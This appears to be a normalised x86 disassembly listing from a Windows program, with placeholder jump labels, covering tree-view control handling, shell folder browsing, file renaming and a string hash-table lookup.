mov ecx esi
call sub_433920
mov ecx [ esi + 0x4 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_433b70
push ecx
mov al [ esp + 0x3 ]
push esi
mov esi ecx
mov [ esi ] al
call sub_432c20
mov [ esi + 0x4 ] eax
mov [ eax + 0x2d ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
mov eax esi
pop esi
pop ecx
retn
sub_433bb0
push 0xffffffff
push sub_4c0063
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34c
push ebx
push ebp
push esi
push edi
xor esi esi
lea eax [ esp + 0x1c ]
push eax
mov [ esp + 0x28 ] esi
mov [ esp + 0x24 ] esi
mov [ esp + 0x30 ] esi
call [ SHGetMalloc@IAT ]
cmp eax esi
jl r-xdata
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x370 ]
push ecx
call sub_41b940
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ esp + 0x35c ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x358
retn
mov ebp [ esp + 0x36c ]
push ebp
call sub_432380
add esp 0x4
mov edi eax
push edi
call [ SetCapture@IAT ]
push 0x7f02
push esi
call [ LoadCursorA@IAT ]
push eax
call [ SetCursor@IAT ]
mov eax [ esp + 0x380 ]
cmp eax esi
je r-xdata
mov ebx [ esp + 0x378 ]
test ebx ebx
je r-xdata
mov [ esp + 0x48 ] esi
mov [ esp + 0x4c ] esi
mov [ esp + 0x50 ] esi
mov ecx [ eax + 0x18 ]
mov ebx 0x10
cmp ecx ebx
mov [ esp + 0x364 ] esi
jb r-xdata
call [ ReleaseCapture@IAT ]
push 0x7f00
push 0x0
call [ LoadCursorA@IAT ]
push eax
call [ SetCursor@IAT ]
mov eax [ esp + 0x2c ]
test eax eax
je r-xdata
mov ecx [ ebx ]
lea edx [ esp + 0x2c ]
push edx
push 0xe0
push edi
push ebx
call [ ecx + 0x10 ]
test eax eax
jl r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esp + 0x2c ]
mov ecx [ eax ]
lea edx [ esp + 0xa0 ]
push edx
lea edx [ esp + 0x24 ]
push edx
push 0x1
push eax
mov [ esp + 0x20 ] 0x0
call [ ecx + 0xc ]
test eax eax
mov edi [ esp + 0x37c ]
jne r-xdata
mov edx [ esp + 0x37c ]
lea eax [ esp + 0x13c ]
push eax
push edi
push 0x110d
push ebp
mov [ esp + 0x150 ] edx
mov [ esp + 0x14c ] 0x40
mov [ esp + 0x16c ] edi
call [ SendMessageA@IAT ]
lea ecx [ esp + 0x44 ]
call sub_4010f0
test eax eax
je r-xdata
push ebp
lea edx [ esp + 0x48 ]
push edx
push eax
lea ecx [ esp + 0x1b0 ]
call sub_403030
lea eax [ esp + 0x1a4 ]
push eax
mov [ esp + 0x368 ] 0x1
mov [ esp + 0x1cc ] 0x2
call sub_4090d0
xor edi edi
add esp 0x4
cmp eax edi
jl r-xdata
mov eax 0x1
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
lea eax [ esp + 0x13c ]
push eax
push 0x0
push 0x110d
push ebp
mov [ esp + 0x150 ] edi
mov [ esp + 0x14c ] 0x40
mov [ esp + 0x16c ] 0x0
call [ SendMessageA@IAT ]
jmp r-xdata
lea ecx [ esp + 0x30 ]
call sub_433b70
mov [ esp + 0x364 ] 0x2
mov [ esp + 0x3c ] edi
mov [ esp + 0x14 ] edi
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x374 ]
push 0x0
push eax
mov eax [ esp + 0x378 ]
push esi
push edi
push ebx
push ecx
push edx
push eax
push ebp
call sub_433290
add esp 0x24
cmp eax esi
je r-xdata
mov eax [ esp + 0x34 ]
mov edi [ eax ]
cmp edi eax
mov [ esp + 0x10 ] edi
je r-xdata
mov ecx [ esp + 0x4c ]
sub ecx eax
mov eax 0x92492493
imul ecx
mov eax [ esp + 0x3c ]
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
cmp eax edx
jae r-xdata
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x1c ]
mov ecx [ eax ]
push edx
push eax
call [ ecx + 0x14 ]
mov eax [ esp + 0x2c ]
mov ecx [ eax ]
lea edx [ esp + 0xa0 ]
push edx
lea edx [ esp + 0x24 ]
push edx
push 0x1
push eax
call [ ecx + 0xc ]
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x1
mov [ esp + 0x24 ] eax
mov esi eax
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0x5c ]
push eax
lea ecx [ esp + 0x3c ]
mov [ esp + 0x370 ] 0x1
call sub_433920
mov ecx [ esp + 0x34 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
mov [ esp + 0x34 ] eax
mov [ esp + 0x38 ] eax
jmp r-xdata
mov ecx [ edi + 0x28 ]
mov esi [ SendMessageA@IAT ]
push ecx
push 0x4
push 0x110a
push ebp
call esi
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
mov edx [ eax ]
push 0x14
push eax
call [ edx + 0xc ]
mov esi eax
test esi esi
mov [ esp + 0x40 ] esi
je r-xdata
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x1a4 ]
call sub_401a00
lea ecx [ esp + 0x44 ]
mov [ esp + 0x364 ] 0xffffffff
call sub_403b20
jmp r-xdata
lea ecx [ esp + 0x10 ]
call sub_432ab0
mov edi [ esp + 0x10 ]
mov eax [ esp + 0x34 ]
cmp edi eax
jne r-xdata
lea eax [ esp + 0x74 ]
push eax
push 0x0
mov [ esp + 0x7c ] 0x8
mov edx [ edi + 0x28 ]
push 0x110c
push ebp
mov [ esp + 0x88 ] edx
call esi
test [ esp + 0x7c ] 0x40
je r-xdata
mov eax [ esp + 0x48 ]
cmp [ edi + eax + 0x18 ] ebx
mov ebp [ esp + 0x37c ]
jb r-xdata
mov ecx [ edi + 0x28 ]
lea edx [ esp + 0x74 ]
push edx
push 0x0
push 0x110d
push ebp
mov [ esp + 0x88 ] ecx
mov [ esp + 0x84 ] 0x40
mov [ esp + 0xa4 ] 0x0
call esi
lea eax [ edi + eax + 0x4 ]
mov eax [ edi + eax + 0x4 ]
jmp r-xdata
lea edi [ edi + ecx + 0x4 ]
mov edi [ edi + ecx + 0x4 ]
jmp r-xdata
push eax
call sub_457f40
mov ecx [ esp + 0x4c ]
mov edx [ edi + ecx + 0x18 ]
add esp 0x4
cmp edx ebx
mov [ esp + 0x28 ] eax
jb r-xdata
cmp ebx ecx
mov eax [ esp + 0x70 ]
mov [ esp + 0x364 ] 0x2
jne r-xdata
mov eax [ esp + 0x18 ]
mov al [ edi + eax ]
mov dl al
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
add eax edi
push eax
mov [ esp + 0x1c ] eax
xor ebx ebx
call [ lstrlenA@IAT ]
mov ecx eax
xor edi edi
mov [ esp + 0x10 ] ecx
mov [ esp + 0x70 ] 0xf
mov [ esp + 0x6c ] edi
mov [ esp + 0x5c ] 0x0
cmp ecx edi
mov [ esp + 0x364 ] 0x3
jle r-xdata
cmp eax 0x10
jb r-xdata
cmp eax 0x10
jb r-xdata
cmp al 0x5c
je r-xdata
inc edi
jmp r-xdata
xor eax eax
push 0x70
mov [ esp + 0x74 ] 0xf
mov [ esp + 0x70 ] eax
mov [ esp + 0x60 ] al
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
mov [ esi ] eax
call sub_4b573e
xor edi edi
add esp 0x4
cmp eax edi
je r-xdata
mov edx [ esp + 0x5c ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov [ esp + 0x70 ] 0xf
mov [ esp + 0x6c ] 0x0
mov [ esp + 0x5c ] 0x0
jmp r-xdata
mov ecx [ esp + 0x5c ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x18 ]
push edi
push eax
lea ecx [ esp + 0x60 ]
call sub_401e80
lea ecx [ esp + 0x58 ]
push ecx
lea edx [ esp + 0xa0 ]
push edx
lea ecx [ esp + 0x38 ]
call sub_432c60
mov eax [ esp + 0x9c ]
cmp eax [ esp + 0x34 ]
jne r-xdata
cmp al 0x2f
jne r-xdata
inc edi
cmp edi ecx
jl r-xdata
xor eax eax
mov ecx 0xf
mov [ eax + 0x18 ] ecx
mov [ eax + 0x14 ] edi
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x6c ] ecx
mov [ eax + 0x68 ] edi
mov [ eax + 0x58 ] 0x0
jmp r-xdata
mov ecx [ esp + 0x3c ]
mov eax [ esp + 0x14 ]
mov ebp [ esp + 0x36c ]
inc ecx
add eax 0x70
mov [ esp + 0x3c ] ecx
mov [ esp + 0x14 ] eax
mov edi eax
mov ebx 0x10
jmp r-xdata
mov ebp [ eax + 0x28 ]
mov eax [ esp + 0x1c ]
mov ecx [ eax ]
push 0x14
push eax
call [ ecx + 0xc ]
mov esi eax
xor eax eax
cmp esi eax
je r-xdata
jmp r-xdata
lea eax [ ecx + eax + 0x4 ]
mov eax [ ecx + eax + 0x4 ]
jmp r-xdata
mov edx [ esp + 0x14 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0xc ] 0x4000000
mov ecx [ esp + 0x48 ]
add ecx edx
push ecx
mov ecx eax
call sub_402540
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x14 ]
cmp [ ecx + eax + 0x18 ] 0x10
mov [ esp + 0x74 ] 0x27
jb r-xdata
mov eax [ esp + 0x48 ]
test eax eax
je r-xdata
mov esi [ esp + 0x40 ]
mov ecx [ esp + 0x10 ]
push 0x70
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
mov [ esi ] eax
call sub_4b573e
add esp 0x4
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0xe4 ]
call sub_4024d0
lea ecx [ esp + 0xe0 ]
push ecx
lea edx [ esp + 0x58 ]
push edx
lea ecx [ esp + 0x38 ]
mov [ esp + 0x36c ] 0x6
call sub_432c60
cmp [ esp + 0xf8 ] 0x10
mov [ esp + 0x364 ] 0x2
jb r-xdata
test [ edx + ecx + 0x1c ] 0x10
je r-xdata
sub esp 0x1c
mov ecx esp
mov [ esp + 0x44 ] esp
push eax
call sub_4024d0
call sub_401530
mov ecx [ esp + 0x64 ]
mov edx [ esp + 0x30 ]
add esp 0x1c
test [ edx + ecx + 0x1f ] 0x10
mov [ esp + 0x28 ] eax
jne r-xdata
xor eax eax
mov ecx eax
call sub_401510
jmp r-xdata
mov ecx [ esp + 0x34 ]
cmp [ esp + 0x54 ] ecx
mov [ esp + 0xf8 ] 0xf
mov [ esp + 0xf4 ] 0x0
mov [ esp + 0xe4 ] 0x0
jne r-xdata
mov eax [ esp + 0xe4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx 0x40
lea eax [ eax + ecx + 0x4 ]
mov eax [ eax + ecx + 0x4 ]
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov [ esi + 0x10 ] eax
mov edx [ esp + 0x48 ]
add ecx edx
push ecx
mov ecx eax
call sub_402540
mov edx [ esi + 0x10 ]
mov eax [ esp + 0x14 ]
mov [ edx + 0x1c ] 0x10000010
mov [ esi + 0xc ] 0x20000000
mov ecx [ esp + 0x48 ]
cmp [ eax + ecx + 0x18 ] 0x10
jb r-xdata
mov eax [ esi + 0xc ]
or eax 0x20000000
mov ecx 0x40
mov [ esi + 0xc ] eax
mov eax [ esp + 0x28 ]
mov [ esp + 0x94 ] 0x1
mov [ esp + 0x74 ] 0x6f
mov [ esp + 0x7c ] ecx
mov [ esp + 0x80 ] ecx
mov edi 0x10
jmp r-xdata
mov edx [ esp + 0x18 ]
add ebx edx
mov eax edi
lea esi [ esp + 0x74 ]
xor ecx ecx
mov [ esp + 0x84 ] ebx
mov [ esp + 0x88 ] 0x104
call sub_4325f0
mov ebx [ esp + 0x40 ]
mov edx [ esp + 0x36c ]
mov eax [ esp + 0x24 ]
mov ecx 0xa
lea esi [ esp + 0x74 ]
lea edi [ esp + 0xac ]
mov [ esp + 0x98 ] ebx
[ edi ] [ esi ]
lea ecx [ esp + 0xa4 ]
push ecx
xor edi edi
push edi
push 0x1100
push edx
mov [ esp + 0xb8 ] eax
mov [ esp + 0xb4 ] ebp
call [ SendMessageA@IAT ]
mov esi eax
test [ ebx + 0xc ] 0x20000000
mov [ esp + 0x24 ] esi
je r-xdata
cmp eax 0x7
je r-xdata
mov ecx [ esp + 0x10 ]
lea ebx [ edi + 0x1 ]
mov ecx [ esp + 0x28 ]
lea edx [ edi + ecx ]
mov ecx [ esi + 0x10 ]
push edx
push eax
call sub_401e80
mov ecx [ esi + 0x10 ]
push r--data
call sub_402010
mov ecx [ esp + 0x18 ]
mov eax edi
sub eax ebx
inc eax
push eax
add ebx ecx
push ebx
lea edx [ esp + 0x260 ]
push edx
call [ lstrcpynA@IAT ]
mov eax 0x40
mov [ esp + 0xb4 ] eax
mov [ esp + 0xb8 ] eax
lea eax [ esp + 0x258 ]
mov [ esp + 0xbc ] eax
mov [ esp + 0xd0 ] esi
mov eax 0x10
lea esi [ esp + 0xac ]
xor ecx ecx
mov [ esp + 0xac ] 0x6f
mov [ esp + 0xcc ] 0x1
mov [ esp + 0xc0 ] 0x104
call sub_4325f0
mov edx [ esp + 0x36c ]
lea ecx [ esp + 0xa4 ]
push ecx
xor esi esi
push esi
push 0x1100
push edx
mov [ esp + 0xb8 ] 0xffff0002
mov [ esp + 0xb4 ] ebp
call [ SendMessageA@IAT ]
mov ebp eax
mov [ esp + 0x114 ] 0xf
mov [ esp + 0x110 ] esi
mov [ esp + 0x100 ] 0x0
mov [ esp + 0x118 ] esi
push 0xffffffff
push esi
lea eax [ esp + 0x60 ]
push eax
lea ecx [ esp + 0x108 ]
mov [ esp + 0x370 ] 0x4
call sub_401dd0
lea ecx [ esp + 0xfc ]
push ecx
lea ecx [ esp + 0x188 ]
mov [ esp + 0x11c ] ebp
call sub_432cd0
lea edx [ esp + 0x184 ]
push edx
lea eax [ esp + 0xdc ]
push eax
lea ecx [ esp + 0x38 ]
mov [ esp + 0x36c ] 0x5
call sub_4339e0
lea ecx [ esp + 0x184 ]
call sub_4480e0
lea ecx [ esp + 0xfc ]
mov [ esp + 0x364 ] 0x3
call sub_4480e0
mov esi [ esp + 0x40 ]
jmp r-xdata
cmp eax 0x6
je r-xdata
mov [ esp + 0x134 ] 0xf
mov [ esp + 0x130 ] edi
mov [ esp + 0x120 ] 0x0
mov [ esp + 0x138 ] edi
mov eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x120 ]
mov [ esp + 0x368 ] 0x7
call sub_402510
lea ecx [ esp + 0x11c ]
push ecx
lea ecx [ esp + 0x168 ]
mov [ esp + 0x13c ] esi
call sub_432cd0
lea edx [ esp + 0x164 ]
push edx
lea eax [ esp + 0xdc ]
push eax
lea ecx [ esp + 0x38 ]
mov [ esp + 0x36c ] 0x8
call sub_4339e0
lea ecx [ esp + 0x164 ]
call sub_4480e0
lea ecx [ esp + 0x11c ]
mov [ esp + 0x364 ] 0x2
call sub_4480e0
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
mov eax [ esp + 0x74 ]
or edx 0x20000000
or eax ecx
mov [ esi + 0xc ] edx
mov [ esp + 0x94 ] 0x1
mov [ esp + 0x74 ] eax
xor edi edi
sub_4345a0
sub esp 0x474
push ebx
push esi
mov esi [ esp + 0x488 ]
mov eax [ esi + 0x8 ]
cmp eax 0xfffffffb
push edi
ja r-xdata
cmp eax 0xfffffffd
jne r-xdata
je r-xdata
mov eax [ esp + 0x494 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x474
retn
lea edx [ esp + 0x10 ]
push edx
call [ GetCursorPos@IAT ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
lea edx [ esp + 0x1c ]
mov [ esp + 0x1c ] eax
mov eax [ esi ]
push edx
push eax
mov [ esp + 0x28 ] ecx
call [ ScreenToClient@IAT ]
mov edx [ esi ]
mov edi [ SendMessageA@IAT ]
lea ecx [ esp + 0x1c ]
push ecx
push 0x0
push 0x1111
push edx
call edi
mov al [ esp + 0x24 ]
mov ebx 0x4
test bl al
je r-xdata
lea ecx [ esp + 0x10 ]
push ecx
call [ GetCursorPos@IAT ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
lea ecx [ esp + 0x1c ]
mov [ esp + 0x1c ] edx
mov edx [ esi ]
push ecx
push edx
mov [ esp + 0x28 ] eax
call [ ScreenToClient@IAT ]
mov ecx [ esi ]
mov edi [ SendMessageA@IAT ]
lea eax [ esp + 0x1c ]
push eax
push 0x0
push 0x1111
push ecx
call edi
mov al [ esp + 0x24 ]
mov ebx 0x4
test bl al
je r-xdata
add eax 0x19c
cmp eax 0xa
ja r-xdata
mov edx [ esi ]
mov eax [ esp + 0x28 ]
lea ecx [ esp + 0x30 ]
push ecx
push 0x0
push 0x110c
push edx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x44 ] eax
call edi
test eax eax
je r-xdata
mov ecx [ esi ]
mov edx [ esp + 0x28 ]
lea eax [ esp + 0x30 ]
push eax
push 0x0
push 0x110c
push ecx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x44 ] edx
call edi
test eax eax
je r-xdata
jmp [ eax * 4 + jump_table_434d38 ]
mov ecx [ esp + 0x54 ]
mov eax [ ecx + 0x10 ]
test eax eax
jne r-xdata
mov edx [ esp + 0x28 ]
mov eax [ esi ]
push edx
push 0x9
push 0x110b
push eax
call edi
mov ecx [ esp + 0x34 ]
mov edx [ esi ]
mov ebx [ esp + 0x54 ]
push ecx
push 0x3
push 0x110a
push edx
call edi
test eax eax
mov [ esp + 0x34 ] eax
je r-xdata
mov ax [ esi + 0xc ]
cmp ax 0xd
jne r-xdata
lea edx [ esp + 0x10 ]
push edx
call [ GetCursorPos@IAT ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
lea edx [ esp + 0x1c ]
mov [ esp + 0x1c ] eax
mov eax [ esi ]
push edx
push eax
mov [ esp + 0x28 ] ecx
call [ ScreenToClient@IAT ]
mov edx [ esi ]
mov edi [ SendMessageA@IAT ]
lea ecx [ esp + 0x1c ]
push ecx
push 0x0
push 0x1111
push edx
call edi
mov al [ esp + 0x24 ]
mov ebx 0x4
test bl al
je r-xdata
mov ebx [ esi + 0x1c ]
test ebx ebx
je r-xdata
mov eax [ esi ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x9
push 0x110a
push eax
call edi
mov ebx eax
test ebx ebx
jne r-xdata
mov esi [ esi + 0x34 ]
test esi esi
je r-xdata
mov ecx rw-data
call sub_401f20
test [ esi + 0x40 ] 0x40
jne r-xdata
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov ecx [ ecx + 0x8 ]
lea eax [ esp + 0x70 ]
push eax
push ecx
call [ SHGetPathFromIDListA@IAT ]
jmp r-xdata
mov ecx [ esi ]
lea eax [ esp + 0x30 ]
push eax
push 0x0
push 0x110c
push ecx
call edi
test eax eax
je r-xdata
cmp ax 0x9
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ esi ]
push eax
push 0x9
push 0x110b
push ecx
call edi
mov ecx [ esi ]
mov edx [ esp + 0x28 ]
lea eax [ esp + 0x30 ]
push eax
push 0x0
push 0x110c
push ecx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x44 ] edx
call edi
test eax eax
je r-xdata
mov eax [ esi + 0x30 ]
mov ecx [ eax + 0x8 ]
lea edx [ esp + 0x174 ]
push edx
push ecx
call [ SHGetPathFromIDListA@IAT ]
lea edx [ esp + 0x174 ]
push edx
call sub_457f40
mov edi eax
add esp 0x4
test edi edi
jle r-xdata
mov edx [ esi ]
lea ecx [ esp + 0x30 ]
push ecx
push 0x0
push 0x110c
push edx
mov [ esp + 0x40 ] 0x4
mov [ esp + 0x44 ] ebx
call edi
test eax eax
je r-xdata
mov ecx rw-data
call sub_401f20
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov edi [ esi + 0x5c ]
test edi edi
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push 0x1
lea eax [ esp + 0x74 ]
push 0xffffffff
push eax
call sub_425d10
add esp 0xc
mov eax [ esp + 0x54 ]
mov ecx [ eax + 0x10 ]
test ecx ecx
jne r-xdata
cmp ax 0x25
je r-xdata
mov ecx [ rw-data ]
push ecx
call [ SetFocus@IAT ]
jmp r-xdata
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
mov ecx [ esp + 0x54 ]
mov eax [ ecx + 0x10 ]
test eax eax
je r-xdata
push ebx
lea eax [ esp + edi + 0x178 ]
push eax
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x54 ]
mov eax [ ecx + 0x10 ]
test eax eax
lea esi [ ecx + 0x10 ]
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
mov edi [ esp + 0x494 ]
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ edi + 0x10 ]
mov ecx [ esi + 0x3c ]
mov edx [ edi ]
push eax
mov eax [ edi + 0x8 ]
push ecx
mov ecx [ esp + 0x498 ]
push edx
mov edx [ esi ]
push eax
push ecx
push edx
call sub_433bb0
mov eax [ esi + 0x3c ]
add esp 0x18
lea edx [ esp + 0x5c ]
push edx
push 0x0
mov [ esp + 0x64 ] eax
mov eax [ esi ]
mov [ esp + 0x68 ] sub_432880
mov ecx [ edi ]
push 0x1115
push eax
mov [ esp + 0x74 ] ecx
call [ SendMessageA@IAT ]
jmp r-xdata
push eax
lea edx [ esp + 0x74 ]
push edx
call [ lstrcpyA@IAT ]
mov eax [ eax ]
mov ecx [ esi ]
lea edx [ esp + 0x10 ]
push edx
push 0x1
add ebx 0x4
push ebx
push eax
push ecx
call sub_4323e0
add esp 0x14
jmp r-xdata
cmp ax 0x26
je r-xdata
push 0x1
push 0xffffffff
push eax
call sub_425d10
mov eax [ rw-data ]
add esp 0xc
push eax
call [ SetFocus@IAT ]
jmp r-xdata
mov eax rw-data
mov eax [ ecx + 0x8 ]
lea edx [ esp + 0x70 ]
push edx
push eax
call [ SHGetPathFromIDListA@IAT ]
lea ecx [ esp + 0x70 ]
push 0x0
push ecx
call sub_432d00
add esp 0x8
jmp r-xdata
test [ ecx + 0xc ] 0x20000000
jne r-xdata
inc edi
push edi
lea ecx [ esp + 0x178 ]
push ecx
lea edx [ esp + 0x78 ]
push edx
call [ lstrcpynA@IAT ]
push ebx
lea eax [ esp + 0x74 ]
push eax
call [ lstrcatA@IAT ]
lea ecx [ esp + 0x70 ]
push ecx
lea edx [ esp + 0x178 ]
push edx
call [ MoveFileA@IAT ]
test eax eax
jne r-xdata
mov ecx [ ecx + 0x8 ]
lea eax [ esp + 0x70 ]
push eax
push ecx
call [ SHGetPathFromIDListA@IAT ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx [ edi ]
push eax
push edi
call [ edx + 0x14 ]
cmp ax 0x27
je r-xdata
cmp [ eax + 0x18 ] 0x10
jb r-xdata
lea eax [ esp + 0xc ]
push eax
call [ SHGetDesktopFolder@IAT ]
test eax eax
jl r-xdata
push 0x10
push r--data
push r--data
push eax
call [ MessageBoxA@IAT ]
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
je r-xdata
mov ecx [ edi ]
push eax
push edi
call [ ecx + 0x14 ]
cmp ax 0x28
je r-xdata
lea ecx [ eax + 0x4 ]
push eax
push ecx
call sub_432d00
add esp 0x8
jmp r-xdata
mov ecx [ eax + 0x4 ]
push eax
push ecx
call sub_432d00
add esp 0x8
jmp r-xdata
push 0x208
lea ecx [ esp + 0x27c ]
push ecx
push 0xffffffff
lea edx [ esp + 0x7c ]
push edx
push 0x1
push 0x0
call [ MultiByteToWideChar@IAT ]
mov eax [ esp + 0xc ]
mov ecx [ eax ]
lea edx [ esp + 0x6c ]
push edx
lea edx [ esp + 0x1c ]
push edx
lea edx [ esp + 0x70 ]
push edx
lea edx [ esp + 0x284 ]
push edx
push 0x0
push 0x0
push eax
call [ ecx + 0xc ]
mov eax [ esi + 0x10 ]
mov ecx [ esi ]
push eax
push 0x3
push 0x110a
push ecx
call [ SendMessageA@IAT ]
test eax eax
mov [ esp + 0x58 ] eax
jne r-xdata
lea edx [ esp + 0x70 ]
push edx
mov ecx rw-data
call sub_402510
mov [ rw-data ] ebx
jmp r-xdata
push esi
call sub_45dd10
add esp 0x4
test al al
jne r-xdata
push eax
lea eax [ esp + 0x74 ]
push eax
call [ lstrcpyA@IAT ]
mov esi [ esi ]
mov ecx [ esi + 0x1c ]
and ecx 0x10000010
cmp ecx 0x10000010
jne r-xdata
mov edx [ edi ]
push esi
push edi
call [ edx + 0x14 ]
jmp r-xdata
mov ecx ebx
call sub_401a90
push ebx
call j_sub_4b66ed#2
add esp 0x4
mov edx [ rw-data ]
push edx
call [ SetFocus@IAT ]
movzx eax [ esi + 0xc ]
mov ecx [ rw-data ]
push 0x0
push eax
push 0x100
push ecx
call [ SendMessageA@IAT ]
jmp r-xdata
mov ebx [ esp + 0x18 ]
push ebp
xor ebp ebp
xor edi edi
push eax
lea edx [ esp + 0x74 ]
push edx
call sub_42dee0
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x49c ]
mov ecx [ eax ]
add esp 0x8
push edx
push eax
call [ ecx + 0x14 ]
jmp r-xdata
push r--data
lea edx [ esp + 0x74 ]
push edx
call [ lstrcatA@IAT ]
jmp r-xdata
mov edx [ esp + 0x498 ]
push ebx
push edx
call sub_4442e0
mov edi eax
add esp 0x8
test edi edi
je r-xdata
mov eax [ esp + 0x498 ]
mov ecx [ eax ]
push edi
push eax
call [ ecx + 0x14 ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x498 ]
push ecx
push edx
call sub_444170
mov ecx [ esi + 0x10 ]
mov edx [ esp + 0x64 ]
push 0x0
mov ebx eax
mov eax [ esp + 0x4a4 ]
push eax
mov eax [ esp + 0x4a4 ]
push ecx
mov ecx [ esi ]
push edx
push ebp
push edi
push ebx
push eax
push ecx
call sub_433290
mov edx [ esi + 0x10 ]
mov eax [ esi ]
add esp 0x2c
push edx
push 0x0
push 0x1101
push eax
call [ SendMessageA@IAT ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
lea edx [ esp + 0x30 ]
push edx
push r--data
push 0x0
push edi
push eax
call [ ecx + 0x14 ]
test eax eax
je r-xdata
test ebp ebp
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
test ebp ebp
je r-xdata
mov eax [ esp + 0x10 ]
mov [ esp + 0x30 ] eax
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
test ebx ebx
mov esi [ esp + 0x498 ]
pop ebp
je r-xdata
mov edx [ ebp ]
push ebp
call [ edx + 0x8 ]
mov eax [ esp + 0x30 ]
mov ebp [ esp + 0x10 ]
push ebx
mov [ esp + 0x14 ] eax
call sub_444150
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
mov edx [ ebp ]
push ebp
call [ edx + 0x8 ]
test edi edi
je r-xdata
mov eax [ esi ]
push ebx
push esi
call [ eax + 0x14 ]
test edi edi
je r-xdata
mov ecx [ esp + 0x18 ]
test ecx ecx
je r-xdata
mov ecx [ esi ]
push edi
push esi
call [ ecx + 0x14 ]
mov eax [ esp + 0x494 ]
mov edx [ eax ]
push ecx
push eax
call [ edx + 0x14 ]
jmp r-xdata
sub_434d70
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ esi ]
mov dl [ ecx ]
xor eax eax
test dl dl
setne al
pop esi
retn 0x4
lea esp [ esp ]
cmp cl 0xa
je r-xdata
add eax 0x2
jmp r-xdata
inc eax
mov [ esi ] eax
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esi ]
mov cl [ eax ]
mov dl cl
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
sub_434dc0
mov edx [ esp + 0x4 ]
push ebx
push ebp
mov ebp ecx
mov cl [ edx ]
push esi
xor eax eax
test cl cl
push edi
je r-xdata
mov edi [ esp + 0x18 ]
mov cl [ edi ]
test cl cl
je r-xdata
imul eax eax 0x709b
movsx ecx cl
add eax ecx
mov cl [ edx + 0x1 ]
inc edx
test cl cl
jne r-xdata
and eax 0x1fff
mov esi eax
xor ebx ebx
lea ecx [ ecx ]
mov edx edi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x8
mov edx [ ebp + esi * 8 ]
mov eax [ esp + 0x14 ]
push edx
push eax
call [ lstrcmpA@IAT ]
test eax eax
jne r-xdata
imul eax eax 0x709b
movsx ecx cl
add eax ecx
mov cl [ edx + 0x1 ]
inc edx
test cl cl
jne r-xdata
inc esi
and esi 0x1fff
inc ebx
cmp ebx 0x2000
jb r-xdata
